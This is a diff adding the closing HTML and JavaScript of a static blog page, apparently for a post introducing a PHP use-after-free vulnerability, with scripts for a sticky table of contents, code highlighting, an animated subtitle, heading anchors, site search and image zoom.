+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "PHP-UAF漏洞初探&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
